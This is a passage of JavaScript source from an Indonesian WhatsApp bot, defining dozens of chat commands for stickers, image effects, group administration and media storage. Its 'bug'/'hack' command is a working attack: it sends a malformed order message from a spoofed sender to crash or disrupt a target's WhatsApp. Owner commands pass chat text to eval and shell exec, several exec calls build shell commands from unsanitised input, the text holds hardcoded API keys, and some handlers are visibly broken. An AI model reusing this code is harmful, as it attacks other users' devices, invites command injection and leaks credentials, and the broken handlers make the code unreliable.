				if (isLimit(sender)) return reply(ind.limitend(pushname))
                    zaki.updatePresence(from, Presence.composing) 
					data = await fetchJson(`https://docs-jojo.herokuapp.com/api/infohoax`, {method: 'get'})
					teks = '♡───────────♡\n'
					for (let i of data.result) {
						teks += `*➸ Gambar* : ${i.img}\n*➸ Title* : ${i.title}\n*➸ Link* : ${i.url}\n*➸ Tanggal* : ${i.tanggal}\n*➸ Desc:* ${i.desc}\n♡───────────♡\n`
					}
					reply(teks.trim())
					await limitAdd(sender)
					break                                                  

//---stiker wasted
case 'wasted':
  case 'was':
if (!isRegister) return reply(mess.only.daftarB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ger = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply (mess.wait)
  owgi = await zaki.downloadAndSaveMediaMessage(ger)
  anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
  teks = `${anu.display_url}`
  ranp = getRandom('.gif') 
  rano = getRandom('.webp')
  anu1 = `https://some-random-api.ml/canvas/wasted?avatar=${teks}`
  exec(`wget ${anu1} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=20 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
fs.unlinkSync(`./temp/sticker/${ranp}`)
if (err) return reply(mess.error.stick)
nobg = fs.readFileSync(`./temp/sticker/${nobg}`)
zaki.sendMessage(from, nobg, sticker, {
  quoted: mek
})
fs.unlinkSync(rano)
  })

} else {
  reply('Gunakan foto!')
}
break                                                  

case 'drawing':
if (!isRegister) return reply(mess.only.daftarB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply (mess.wait)
  owgi = await zaki.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
  hehe = await getBuffer(`https://lindow-api.herokuapp.com/api/sketcheffect?img=${anu.display_url}&apikey=LindowApi`)
 zaki.sendMessage(from, hehe, image, {quoted:mek})
} else {
  reply('Jangan tambah kan apapun pada command')
}
break                       

case 'pencil':
if (!isRegister) return reply(mess.only.daftarB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply (mess.wait)
  owgi = await zaki.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
  hehe = await getBuffer(`https://api.lolhuman.xyz/api/editor/pencil?apikey=${lolKey}&img=${anu.display_url}`)
 zaki.sendMessage(from, hehe, image, {quoted:mek})
} else {
  reply('Jangan tambah kan apapun pada command')
}
break


case 'wanted':
if (!isRegister) return reply(mess.only.daftarB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply (mess.wait)
  owgi = await zaki.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
  hehe = await getBuffer(`https://lindow-api.herokuapp.com/api/wanted?img=${anu.display_url}&text=Wanted&text2=100.000.000&apikey=LindowApi`)
 zaki.sendMessage(from, hehe, image, {quoted:mek})
} else {
  reply('Jangan tambah kan apapun pada command')
}
break                                                  
case 'shundtheseep':

if (!isRegister) return reply(mess.only.daftarB)

var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply (mess.wait)
  owgi = await zaki.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
  hehe = await getBuffer(`https://api.xteam.xyz/videomaker/shaunthesheep?url=${anu.display_url}&APIKEY=${apixteam}`)
 zaki.sendMessage(from, hehe, video, {quoted:mek})
} else {
  reply('Jangan tambah kan apapun pada command')
}
break                                                  

case 'komunis':

	  if (!isRegister) return reply(mess.only.daftarB)
	  
	  if (isLimit(sender)) return reply(ind.limitend(pushname))
				
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait)
	  owgi = await zaki.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`http://zekais-api.herokuapp.com/comunism?url=${anu.display_url}`)
	 zaki.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break                                                  
	case 'deletepc':
	  if (!isRegister) return reply(mess.only.daftarB) 
	  
	  if (isLimit(sender)) return reply(ind.limitend(pushname))
				
	var imgbb = require('imgbb-uploader')
	if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
	  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
	  reply(ind.wait)
	  owgi = await zaki.downloadAndSaveMediaMessage(ted)
	  tels = body.slice(7)
	  anu = await imgbb("3ea1465ef91578a90ee81f7d41c59a1f", owgi)
	  hehe = await getBuffer(`http://zekais-api.herokuapp.com/delete?url=${anu.display_url}`)
	 zaki.sendMessage(from, hehe, image, {quoted:mek})
	} else {
	  reply('Jangan tambah kan apapun pada command')
	}
	break                                                  
case 'gtav':
if (!isRegister) return reply(mess.only.daftarB)
var imgbb = require('imgbb-uploader')
if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
  ted = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo: mek
  reply (mess.wait)
  owgi = await zaki.downloadAndSaveMediaMessage(ted)
  tels = body.slice(7)
  anu = await imgbb("2f4cd984b209e2f928f9dde2a8ead311", owgi)
  hehe = await getBuffer(`https://lindow-api.herokuapp.com/api/grandtheftauto?img=${anu.display_url}&apikey=LindowApi`)
 zaki.sendMessage(from, hehe, image, {quoted:mek})
} else {
  reply('Jangan tambah kan apapun pada command')
}
break                                                  
//endstickermenu
           case 'quran':
					anu = await fetchJson(`https://api.banghasan.com/quran/format/json/acak`, {method: 'get'})
					quran = `${anu.acak.ar.teks}\n\n${anu.acak.id.teks}\nQ.S ${anu.surat.nama} ayat ${anu.acak.id.ayat}`
					zaki.sendMessage(from, quran, text, {quoted: mek})
					break                                                  
         
				case 'add':
					zaki.updatePresence(from, Presence.composing) 
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isOwner) return reply(mess.only.ownerB)
					if (args.length < 1) return reply('Yang mau di add jin ya?')
					if (args[0].startsWith('08')) return reply('Gunakan kode negara mas')
					try {
						num = `${args[0].replace(/ /g, '')}@s.whatsapp.net`
						zaki.groupAdd(from, [num])
					} catch (e) {
						console.log('Error :', e)
						reply('Gagal menambahkan target, mungkin karena di private')
					}
					break                                                  

				case 'kick':
					zaki.updatePresence(from, Presence.composing) 
					if (!isOwner) return reply(mess.only.ownerB)
					if (mek.message.extendedTextMessage === undefined || mek.message.extendedTextMessage === null) return reply('Tag target yang ingin di tendang!')
					mentioned = mek.message.extendedTextMessage.contextInfo.mentionedJid
					if (mentioned.length > 1) {
						teks = 'Perintah di terima, mengeluarkan :\n'
						for (let _ of mentioned) {
							teks += `@${_.split('@')[0]}\n`
						}
						mentions(teks, mentioned, true)
						zaki.groupRemove(from, mentioned)
					} else {
						mentions(`Perintah di terima, mengeluarkan : @${mentioned[0].split('@')[0]}`, mentioned, true)
						zaki.groupRemove(from, mentioned)
					zaki.sendMessage(mentioned, 'yahaha Lu kekickðŸ˜‚', text)
					}
					break                                                  
/***********EVAL*********/
case '>':
var konsol = args.join(' ')
function sendResult(sul) {
var sat = JSON.stringify(sul, null, 2)
var bang = util.format(sat)
return reply(bang)
}
reply(util.format(eval(`;(async () => { ${konsol} })()`)))
break                                                  
case 'komiku':
komiku(q).then(res => {
console.log(res) 
})
break 

case 'bug':

            case 'hack':

            case 'kudet':
            if (!isOwner) return reply(ind.ownerb())
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
function troli(nomor){
zaki.sendMessage(nomor,`HALO GAN`,MessageType.extendedText,{
 quoted: {
  key: {
   participant: '0@s.whatsapp.net' // Fake sender Jid
  },
  message: {
    orderMessage: {
    thumbnail: dnsnew,
    itemCount: -969769349, // Bug
    status: 1,
    surface: 1,
    message: '☠️Asylum☠️',
    orderTitle: 'AsylumVirus', // Idk what this does
    sellerJid: '0@s.whatsapp.net' // Seller
   }
  }
 }
})
}
function bug(jid){
for(let i=0;i < 1;i++){
var
WA_DEFAULT_EPHEMERAL = require('@adiwajshing/baileys')
zaki.toggleDisappearingMessages(jid, WA_DEFAULT_EPHEMERAL)
}}
async function attack(targett){
bug(targett)
await sleep(3000)
troli(targett)
await sleep(3000)
bug(targett)
}

attack(mek.key.remoteJid)
break                                         
					
					case 'get':
                if (!isOwner) return reply('「 *KHUSUS OWNER LU SIAPA?* 」')
            if(!q) return reply('linknya?')

            fetch(`${args[0]}`).then(res => res.text())  
            .then(bu =>{
            reply(bu)
            })   
            break
case 'clearall':

                if (!isOwner) return reply(ind.ownerB())

                let chiit = await zaki.chats.all()
                for (let i of chiit){
                    zaki.modifyChat(i.jid, 'clear', {
                        includeStarred: false
                    })
                }
                reply(`Selesai`)
           
                break
case 'return':
  if (!isOwner) return reply(ind.ownerB())
         
				return zaki.sendMessage(from, JSON.stringify(eval(args.join(' '))), text, {quoted: mek})
				break                                                  
case 'run':
                if (!isOwner) return reply(mess.only.ownerB)
                sy = args.join(' ')
                return eval(sy)
                break                                                  

				case 'exe':
	              zaki.updatePresence(from, Presence.composing) 
	              if (!isOwner) return reply(ind.ownerB())
	               const cmd = body.slice(5)
	               exec(cmd, (err, stdout) => {
		           if(err) return zaki.sendMessage(from, "Command Salah", text, { quoted: mek })
		           if (stdout) {
			       zaki.sendMessage(from, stdout, text, { quoted: mek })
		           }
	           })
                  break                                                  
/**************End Eval****************/
                  case 'notif':

if (!isGroupAdmins) return reply(mess.only.admin)
zaki.updatePresence(from, Presence.composing)
if (!isRegister) return reply(mess.only.daftarB)
if (!isGroup) return fakeimage(mess.only.group)
teks = `Notif dari @${sender.split("@")[0]}\n*Pesan : ${body.slice(7)}*`
group = await zaki.groupMetadata(from);
member = group['participants']
jids = [];
member.map(async adm => {
  jids.push(adm.id.replace('c.us', 's.whatsapp.net'));
})
options = {
  text: teks,
  contextInfo: {
mentionedJid: jids
  },
  quoted: mek
}
await zaki.sendMessage(from, options, text)
break                                                  
                 case 'linkgroup':
				case 'linkgrup':
				case 'linkgc':
				    zaki.updatePresence(from, Presence.composing) 
				    if (!isGroup) return fakeimage(mess.only.group)
                                     if (!isRegister) return reply(mess.only.daftarB)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					linkgc = await zaki.groupInviteCode (from)
					console.log("group code: " + code)
					yeh = `https://chat.whatsapp.com/${linkgc}\n\nLink Group *${groupName}*`
					zaki.sendMessage(from, yeh, text, {quoted: mek, detectLinks: false})
					break                                                  
                case 'qrcode':
                if (!isRegister) return reply(mess.only.daftarB)
                if (isLimit(sender)) return reply(ind.limitend(pushname))
                buff = await getBuffer(`https://api.qrserver.com/v1/create-qr-code/?data=${body.slice(8)}&size=1080%C3%971080`)
				zaki.sendMessage(from, buff, image, {quoted: mek})
                                await limitAdd(sender)
				break                                                  
				case 'ocr':
					if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
						const encmedial = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo : mek
						const media = await zaki.downloadAndSaveMediaMessage(encmedial)
						reply (mess.wait)
						await recognize(media, {lang: 'eng+ind', oem: 1, psm: 3})
							.then(teks => {
								reply(teks.trim())
								fs.unlinkSync(media)
							})
							.catch(err => {
								reply(err.message)
								fs.unlinkSync(media)
							})
					} else {
						reply('Foto aja mas')
					}
					break                                                  

                      case 'bugreport':
                     const bugcc = body.slice(5)
                      if (pesan.length > 300) return zaki.sendMessage(from, 'Maaf Teks Terlalu Panjang, Maksimal 300 Teks', msgType.text, {quoted: mek})
                        var nomor = mek.participant
                       teks1 = `*[REPORT]*\nNomor : @${nomor.split("@s.whatsapp.net")[0]}\nPesan : ${pesan}`
                      var options = {
                         text: teks1,
                         contextInfo: {mentionedJid: [nomor]},
                     }
                    zaki.sendMessage(NomerOwner, options, text, {quoted: mek})
                    reply('Masalah telah di laporkan ke owner BOT, laporan palsu/main2 tidak akan ditanggapi.')
                    break                                                  

               case 'apakah':
               zaki.updatePresence(from, Presence.composing) 

               randomm = apakah[Math.floor(Math.random() * (apakah.length))]
  	
			   hasil = `Pertanyaan : *${body.slice(1)}*\n\nJawaban : *${randomm}*`
			   reply(hasil)
			   break                                                  
              case 'bisakah':
                zaki.updatePresence(from, Presence.composing) 
              if (!isRegister) return reply(mess.only.daftarB)
                randome = bisakah[Math.floor(Math.random() * (bisakah.length))]
  	
			   hasil = `Pertanyaan : *${body.slice(1)}*\n\nJawaban : *${randome}*`
			   reply(hasil)
			   break                                                  
//prefix

//End
			
               case 'rate':
              zaki.updatePresence(from, Presence.composing) 
              if (!isRegister) return reply(mess.only.daftarB)
                random = `${Math.floor(Math.random() * 100)}`
               hasil = `Pertanyaan : *${body.slice(1)}*\n\nJawaban : *${random}%*`
              reply(hasil)
                break                                                  
	    case 'kapankah':
               zaki.updatePresence(from, Presence.composing) 
                if (!isRegister) return reply(mess.only.daftarB)
               randomea = kapankah[Math.floor(Math.random() * (kapankah.length))]
               random2 = `${Math.floor(Math.random() * 8)}`
               hasil = `Pertanyaan : *${body.slice(1)}*\n\nJawaban : *${random2} ${randomea}*`
              reply(hasil)
                break                                                  
			case 'closegc':
					zaki.updatePresence(from, Presence.composing) 
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					var nomor = mek.participant
					const close = {
					text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					zaki.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
					break                                                  
                case 'opengc':
                case 'bukagc':
					zaki.updatePresence(from, Presence.composing) 
					if (!isGroup) return fakeimage(mess.only.group)
					if (!isGroupAdmins) return reply(mess.only.admin)
					if (!isBotGroupAdmins) return reply(mess.only.Badmin)
					open = {
					text: `Grup dibuka oleh admin @${sender.split("@")[0]}\nsekarang *semua peserta* dapat mengirim pesan`,
					contextInfo: { mentionedJid: [sender] }
					}
					zaki.groupSettingChange (from, GroupSettingChange.messageSend, false)
					zaki.sendMessage(from, open, text, {quoted: mek})
					break                                                  
					//getmenu
				case 'getsticker':
				case 'getstik':
				case 'ss':
				if (!isOwner) return reply(ind.ownerB)
				if (!isRegister) return reply(mess.only.daftarB)  
				var itsme = `0@s.whatsapp.net`
				var split = `${cr}`
				var cuk = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
					namastc = args[0]
					try {
					result = fs.readFileSync(`./temp/sticker/${namastc}.webp`)
					zaki.sendMessage(from, result, sticker, cuk)
					} catch {
				  reply('Pack tidak terdaftar')
				   }
					break                                                  
				case 'stickerlist':
				case 'liststicker':
				if (!isOwner) return reply(mess.only.ownerB)
				if (!isRegister) return reply(mess.only.daftarB)  
					teks = '*Sticker List :*\n\n'
					for (let awokwkwk of setiker) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${setiker.length}*`
					zaki.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": setiker } })
					break                                                  
				case 'addsticker':
				if (!isOwner) return reply(mess.only.ownerB)
				if (!isRegister) return reply(mess.only.daftarB)  
					svst = body.slice(12)
					if (!svst) return reply('Nama sticker nya apa?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zaki.downloadMediaMessage(boij)
					setiker.push(`${svst}`)
					fs.writeFileSync(`./temp/sticker/${svst}.webp`, delb)
					fs.writeFileSync(`./database/json/stik.json`, JSON.stringify(setiker))
					zaki.sendMessage(from, `Sukses Menambahkan Sticker\nCek dengan cara ${prefix}liststicker`, MessageType.text, { quoted: mek })
					break                                                  
				case 'addvn':
				if (!isOwner) return reply(mess.only.ownerB)
				if (!isRegister) return reply(mess.only.daftarB) 
					svst = body.slice(7)
					if (!svst) return reply('Nama audionya apa kak?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zaki.downloadMediaMessage(boij)
					audionye.push(`${svst}`)
					fs.writeFileSync(`./temp/audio/${svst}.mp3`, delb)
					fs.writeFileSync('./database/json/audio.json', JSON.stringify(audionye))
					zaki.sendMessage(from, `Sukses Menambahkan Audio\nCek dengan cara ${prefix}listvn`, MessageType.text, { quoted: mek })
					break                                                  
					
				case 'getvn':
				if (!isRegister) return reply(mess.only.daftarB)  
				var itsme = `0@s.whatsapp.net`
				var cuk = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
							}
						}
					}
				}
					namastc = body.slice(7)
					try {
					buffer = fs.readFileSync(`./temp/audio/${namastc}.mp3`)
					zaki.sendMessage(from, buffer, audio, {mimetype: 'audio/mp4', quoted: mek, ptt: true})
					} catch {
				  reply('Pack tidak terdaftar')
				}
					break                                                  
				case 'listvn':
				case 'vnlist':
				if (!isRegister) return reply(mess.only.daftarB)  
					teks = '*List Vn:*\n\n'
					for (let awokwkwk of audionye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${audionye.length}*`
					zaki.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": audionye } })
					break                                                  
				case 'addimg':
				if (!isQuotedImage) return reply('reply imagenya')
				if (!isOwner) return reply(mess.only.ownerB)
				svst = body.slice(8)
				if (!svst) return reply('Nama imagenya apa')
				boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
				delb = await zaki.downloadMediaMessage(boij)
				imagenye.push(`${svst}`)
				fs.writeFileSync(`./temp/image/${svst}.jpeg`, delb)
				fs.writeFileSync('./temp/image.json', JSON.stringify(imagenye))
				zaki.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listimage`, MessageType.text, { quoted: mek })
				break                                                  

			case 'getimg':
				namastc = body.slice(8)
				try {
				buffer = fs.readFileSync(`./temp/image/${namastc}.jpeg`)
				zaki.sendMessage(from, buffer, image, { quoted: mek, caption: `Result From Database : ${namastc}.jpeg` })
				} catch {
				  reply('Pack tidak terdaftar')
				}
				break                                                  

				case 'imagelist':
				case 'listimage':
				if (!isRegister) return reply(mess.only.daftarB)  
					teks = '*List Image :*\n\n'
					for (let awokwkwk of imagenye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${imagenye.length}*`
					zaki.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": imagenye } })
					break                                                  
				case 'addvideo':
				if (!isRegister) return reply(mess.only.daftarB) 
					svst = body.slice(10)
					if (!svst) return reply('Nama videonya apa kak?')
					boij = JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo
					delb = await zaki.downloadMediaMessage(boij)
					videonye.push(`${svst}`)
					fs.writeFileSync(`./temp/video/${svst}.mp4`, delb)
					fs.writeFileSync('./database/json/video.json', JSON.stringify(videonye))
					zaki.sendMessage(from, `Sukses Menambahkan Video\nCek dengan cara ${prefix}listvideo`, MessageType.text, { quoted: mek })
					break                                                  
				case 'getvideo':
				if (!isRegister) return reply(mess.only.daftarB)  
				var itsme = `0@s.whatsapp.net`
				var split = `${cr}`
				var cuk = {
					contextInfo: {
						participant: itsme,
						quotedMessage: {
							extendedTextMessage: {
								text: split,
							}
						}
					}
				}
					namastc = args[0]
					try {
					buffer = fs.readFileSync(`./temp/video/${namastc}.mp4`)
					zaki.sendMessage(from, buffer, video, cuk, { mimetype: 'video/mp4', quoted: mek })
					} catch {
				  reply('Pack tidak terdaftar')
				}
					break                                                  
				case 'listvideo':
				case 'videolist':
				if (!isRegister) return reply(mess.only.daftarB)  
					teks = '*List Video :*\n\n'
					for (let awokwkwk of videonye) {
						teks += `- ${awokwkwk}\n`
					}
					teks += `\n*Total : ${videonye.length}*`
					zaki.sendMessage(from, teks.trim(), extendedText, { quoted: mek, contextInfo: { "mentionedJid": videonye } })
					break                                                  	
				//end getmenu

				case 'sticker':
      case 'stiker':
      case 's':
      case 'sk':
      case 'sgif':
      case 'stikergif':
      case 'stickergif':
        if (!isRegister) return reply(mess.only.daftarB)
        if (isLimit(sender)) return reply(ind.limitend(pushname))
        if ((isMedia && !mek.message.videoMessage || isQuotedImage) && args.length == 0) {
          const encmedia = isQuotedImage ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          const media = await zaki.downloadAndSaveMediaMessage(encmedia)
          ran = getRandom('.webp')
          await ffmpeg(`./${media}`)
            .input(media)
            .on('start', function(cmd) {
              console.log(`Started : ${cmd}`)
            })
            .on('error', function(err) {
              console.log(`Error : ${err}`)
              fs.unlinkSync(media)
              reply(ind.stikga)
            })
            .on('end', function() {
              console.log('Finish')
              exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
                //if (error) {
                // reply(ind.stikga())
                // fs.unlinkSync(media)	
                // fs.unlinkSync(ran)
                // }
                zaki.sendMessage(from, fs.readFileSync(ran), sticker, {
                  quoted: mek
                })
                fs.unlinkSync(media)
                fs.unlinkSync(ran)
              })
            })
            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=20, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(ran)
        } else if ((isMedia && mek.message.videoMessage.seconds < 11 || isQuotedVideo && mek.message.extendedTextMessage.contextInfo.quotedMessage.videoMessage.seconds < 11) && args.length == 0) {
          const encmedia = isQuotedVideo ? JSON.parse(JSON.stringify(mek).replace('quotedM', 'm')).message.extendedTextMessage.contextInfo : mek
          const media = await zaki.downloadAndSaveMediaMessage(encmedia)
          ran = getRandom('.webp')
          reply(ind.wait())
          await ffmpeg(`./${media}`)
            .inputFormat(media.split('.')[1])
            .on('start', function(cmd) {
              console.log(`Started : ${cmd}`)
            })
            .on('error', function(err) {
              console.log(`Error : ${err}`)
              fs.unlinkSync(media)
              tipe = media.endsWith('.mp4') ? 'video' : 'gif'
              reply(`❌ Gagal, pada saat mengkonversi ${tipe} ke stiker`)
            })
            .on('end', function() {
              console.log('Finish')
              exec(`webpmux -set exif ${addMetadata(namo, ator)} ${ran} -o ${ran}`, async (error) => {
                //if (error) {
                // reply(ind.stikga())
                // fs.unlinkSync(media)	
                // fs.unlinkSync(ran)
                // }
                zaki.sendMessage(from, fs.readFileSync(ran), sticker, {
                  quoted: mek
                })
                fs.unlinkSync(media)
                fs.unlinkSync(ran)
              })
            })
            .addOutputOptions([`-vcodec`, `libwebp`, `-vf`, `scale='min(320,iw)':min'(320,ih)':force_original_aspect_ratio=decrease,fps=20, pad=320:320:-1:-1:color=white@0.0, split [a][b]; [a] palettegen=reserve_transparent=on:transparency_color=ffffff [p]; [b][p] paletteuse`])
            .toFormat('webp')
            .save(ran)
        } else {
          reply(`Kirim gambar dengan caption ${prefix}sticker atau tag gambar yang sudah dikirim`)
        }
        await limitAdd(sender)
        reply(`Support *HLX BOT* Ya ${pushname} Instagram.com/ahmadzaki_yo`) 
        break                                                  
						//Random menu 
						case 'closetime':
case 'tutuptime': //Sagiri bukan lonte
              zaki.updatePresence(from, Presence.composing) 
		if (!isRegister) return reply(mess.only.daftarB)
		if (!isGroupAdmins) return reply(ind.admin())
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n10 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const close = {
					text: `Grup ditutup oleh admin @${nomor.split("@s.whatsapp.net")[0]}\nsekarang *hanya admin* yang dapat mengirim pesan`,
					contextInfo: { mentionedJid: [nomor] }
					}
					zaki.groupSettingChange (from, GroupSettingChange.messageSend, true);
					reply(close)
				}, timer)
				break                                                  





case 'opentime': 
					if (!isRegister) return reply(mess.only.daftarB)
                if (!isGroupAdmins) return reply(ind.admin())
              zaki.updatePresence(from, Presence.composing) 
              if (args[1]=="detik") {var timer = args[0]+"000"
				} else if (args[1]=="menit") {var timer = args[0]+"0000"
				} else if (args[1]=="jam") {var timer = args[0]+"00000"
				} else {return reply("*pilih:*\ndetik\nmenit\njam\n\n*contoh*\n100 detik")}
				setTimeout( () => {
					var nomor = mek.participant
					const open = {
					text: `moshi moshi, group telah dibuka oleh @${nomor.split("@s.whatsapp.net")[0]}\njangan jadi sider ya kak`,
					contextInfo: { mentionedJid: [nomor] }
					}
					zaki.groupSettingChange (from, GroupSettingChange.messageSend, false);
					reply(open)
				}, timer)
				break                                                 


case 'cogan':
case 'cecan':
case 'kpop':
case 'bts':
case 'Jungkook':
case 'cyberpunk':
case 'waifu':
case 'neko':
case 'loli':
case 'husbu':
case 'husbu2':
case 'shota':
case 'pokemon':
case 'anime':
case 'nekonime':
case 'sarada':
case 'nakanomiku':
case 'sasuke':
case 'yotsuba':
case 'naruto':
case 'levi':
case 'sakura':
case 'boruto':
case 'minato':
case 'todoroki':
case 'kurumi':
case 'rikka':
case 'kaneki':
case 'mikasa':
case 'hinata':
case 'hancock':
case 'nicorobin':
case 'itadori':
case 'draken':
case 'rem':
case 'kanna':
case 'wallanime':
case 'wallpaperanime':
case 'nekonime':
case 'neko':
case 'miyauchi':
case 'chinokaffu':
case 'akame':
case 'oreki':
case 'todoroki':
case 'shoto':
case 'deku':
case 'mitsuha':
case 'kiminonawa':
case 'mitsuha':
case 'naruto':
case 'boruto':
case 'sarada':
case 'sasuke':
case 'hinata':
case 'kageyama':
case 'tobi':
case 'tobio':
case 'hyuga':
case 'koro':
case 'shikamaru':
case 'sakura':
case 'bertold':
case 'mikasa':
case 'ichigo':
case 'orihime':
case 'levi':
case 'lipai':
case 'erenyeager':
case 'jigen':
case 'aestheticpict':
case 'luffy':
case 'zoro':
case 'sanji':
case 'nami':
case 'roger':
case 'nico':
case 'misuha':
case 'aqua':
case 'megumi':
case 'megumin':
case 'gojo':
case 'gojou':
case 'eliana':
case 'rimuru':
				    zaki.updatePresence(from, Presence.composing) 
				    data = await fetchJson(`https://fdciabdul.tech/api/pinterest?keyword=${command}`, {method: 'get'})
				    reply (mess.wait)
				    n = JSON.parse(JSON.stringify(data));
				    nimek =  n[Math.floor(Math.random() * n.length)];
				    pok = await getBuffer(nimek)
				    zaki.sendMessage(from, pok, image, { quoted: mek})
				    break                                                  
											//--pinterest anime neko

				case 'stickpatrik':
					ranp = getRandom('.gif')
					rano = getRandom('.webp')
					anu = await getBuffer('http://lolhuman.herokuapp.com/api/sticker/patrick?apikey=68bf5ee1047c2e7afe8d0038', {method: 'get'})
                                        if (!isRegister) return reply(mess.only.daftarB)
					if (anu.error) return reply(anu.error)
					exec(`wget ${anu.result} -O ${ranp} && ffmpeg -i ${ranp} -vcodec libwebp -filter:v fps=fps=15 -lossless 1 -loop 0 -preset default -an -vsync 0 -s 512:512 ${rano}`, (err) => {
						fs.unlinkSync(ranp)
						if (err) return reply(mess.error.stick)
						buffer = fs.readFileSync(rano)
						zaki.sendMessage(from, buffer, anu, sticker, {quoted: mek})
						fs.unlinkSync(rano)
					})
					break                                                  

				case 'toimg':
				    zaki.updatePresence(from, Presence.composing)
                                    if (!isRegister) return reply(mess.only.daftarB)
					if (!isQuotedSticker) return reply('reply stickernya um')
					reply (mess.wait)
					encmediaop = JSON.parse(JSON.stringify(mek).replace('quotedM','m')).message.extendedTextMessage.contextInfo
					mediaawo = await zaki.downloadAndSaveMediaMessage(encmediaop)
					ran = getRandom('.png')
					exec(`ffmpeg -i ${mediaawo} ${ran}`, (err) => {
						fs.unlinkSync(mediaawo)
						if (err) return reply('Gagal, pada saat mengkonversi sticker ke gambar')
						buffer = fs.readFileSync(ran)
						zaki.sendMessage(from, buffer, image, {quoted: mek, caption: 'Nihhh...'})
						fs.unlinkSync(ran)
					})
					break                                                  
                	case 'tomp3':
                	zaki.updatePresence(from, Presence.composing) 
                        if (!isRegister) return reply(mess.only.daftarB)
					if (!isQuotedVideo) return reply('reply videonya um')
